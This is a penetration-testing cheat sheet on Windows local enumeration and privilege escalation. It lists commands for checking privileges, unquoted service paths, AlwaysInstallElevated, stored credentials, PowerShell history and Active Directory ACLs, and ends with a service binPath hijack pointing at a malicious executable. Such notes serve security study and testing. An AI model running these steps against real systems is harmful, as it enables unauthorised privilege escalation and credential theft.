# Windows Local Enumeration

!!! tip "Quick win order"
    1. `whoami /priv` — check for SeImpersonatePrivilege (Potato attacks), SeDebugPrivilege
    2. `net localgroup administrators` — already in admin group?
    3. Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`
    4. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    5. Stored credentials: `cmdkey /list`, check for saved RDP/WinRM credentials
    6. Run `winpeas.exe` for a comprehensive sweep — cross-reference findings manually

---

## PowerShell History

```powershell
type (Get-PSReadlineOption).HistorySavePath
```

---

## Logged-On Users

```powershell
.\PsLoggedon.exe \\client74
Get-NetSession -ComputerName client74
```

---

## Registry Enumeration

```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
reg query "HKEY_USERS"
cmdkey /list
```

---

## Service Enumeration

```powershell
wmic service get name,pathname,startmode | findstr /i "auto"
wmic service get name,pathname | findstr /i /v "c:\windows"
```

---

## ACL Enumeration

```powershell
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

---

## Exploit Writable Services

```powershell
sc config VulnService binPath= "C:\attacker\malicious.exe"
net start VulnService
```
